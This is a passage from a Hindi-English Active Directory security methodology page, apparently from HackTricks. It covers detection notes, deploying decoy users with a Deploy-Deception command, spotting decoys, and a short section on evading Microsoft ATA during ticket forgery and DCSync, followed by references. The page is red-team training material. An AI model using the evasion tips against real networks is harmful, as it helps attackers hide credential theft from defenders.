- Operators इन्हें आसानी से बदल सकते हैं, और cross-protocol cluster क्यों suspicious है यह समझाने के लिए ये सबसे अच्छे हैं
- **Operational notes**:
- इनमें से कुछ signals के लिए decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, या service-side visibility चाहिए
- Alerts में promote करने से पहले Samba/Linux clients, appliances, और legacy software के खिलाफ validate करें
- Confidence बढ़ाने के साथ detections को enrichment -> hunting -> alerting में promote करें

### **Deception Techniques को Implement करना**

- Deception implement करने में traps लगाना शामिल है, जैसे decoy users या computers, जिनमें passwords expire न हों या Trusted for Delegation के रूप में marked हों। एक detailed approach में specific rights वाले users बनाना या उन्हें high privilege groups में जोड़ना शामिल है।
- एक practical example tools जैसे: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose` का उपयोग करना है
- Deception techniques deploy करने के बारे में अधिक जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिल सकती है।

### **Deception की पहचान करना**

- **User Objects के लिए**: संदिग्ध indicators में atypical ObjectSID, कम logons, creation dates, और low bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की genuine objects से तुलना करने पर inconsistencies सामने आ सकती हैं। [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) जैसे tools इन deception को पहचानने में मदद कर सकते हैं।

### **Detection Systems को Bypass करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचें।
- **Ticket Impersonation**: ticket creation के लिए **aes** keys का उपयोग detection से बचने में मदद करता है, क्योंकि इससे NTLM की ओर downgrade नहीं होता।
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से execute करना सलाहनीय है, क्योंकि सीधे Domain Controller से execution alerts trigger करेगी।

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
